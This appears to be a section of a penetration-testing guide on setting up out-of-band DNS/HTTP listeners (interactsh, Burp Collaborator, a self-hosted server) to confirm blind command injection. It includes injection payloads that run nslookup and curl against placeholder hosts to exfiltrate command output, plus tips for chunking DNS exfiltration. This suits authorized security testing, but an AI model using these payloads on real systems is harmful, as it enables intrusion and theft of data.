# OOB listener setup — DNS/HTTP catcher for blind command injection

Most real command injection is **blind**: no output, no reliable delay. An out-of-band (OOB) DNS/HTTP catcher both
**confirms** execution and gives you an **exfil channel** (Guide §8/§12). DNS especially tends to escape egress filters
that block outbound HTTP.

## Option A — interactsh (recommended)
```bash
# install (Go)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# run; it prints a unique host like  c8f3...oast.pro
interactsh-client -v
```
Use the printed host in payloads:
```
;nslookup CONFIRM.<id>.oast.pro            # confirmation
;nslookup $(whoami).<id>.oast.pro          # exfil the user
;curl http://<id>.oast.pro/$(id|base64)    # exfil base64(id) over HTTP
```
A hit shown by interactsh — **from the target's server IP**, matching your unique subdomain — confirms blind RCE.

## Option B — Burp Collaborator
Burp Pro → Collaborator → "Copy to clipboard" gives you a `*.oastify.com` host. Same payloads; poll for DNS/HTTP
interactions. "Collaborator Everywhere" can auto-inject it across traffic to surface hidden sinks.

## Option C — your own server (no third party)
```bash
# DNS: run a tiny authoritative responder for a domain you own and tail the query log, OR
# HTTP: a logging listener (only catches HTTP egress)
python3 -m http.server 80         # then ;curl http://YOUR_IP/$(id|base64)
# Watch the access log for the request path = your exfiltrated data.
```

## DNS exfil tips
- DNS labels max 63 chars, full name max 253 → **chunk** base64 output and send multiple labels/queries.
- Strip `=` padding; `fold -w60`; reassemble on your side.
- Prefer `nslookup`/`dig`/`host` (present on most Linux); on Windows use `nslookup` / `Resolve-DnsName`.

## Evidence to capture
- The exact payload sent.
- The interaction record: your unique subdomain + **the source IP = the target server** + timestamp.
- For exfil: the decoded value (e.g., `www-data` / hostname / first lines of a secret) — redact secrets in the report.

> A DNS-only callback from the **server IP**, tied to your unique token, is solid proof of blind command execution.
> Strengthen it by exfiltrating `$(whoami)`/`$(hostname)` so the callback *carries* command output, not just a ping.
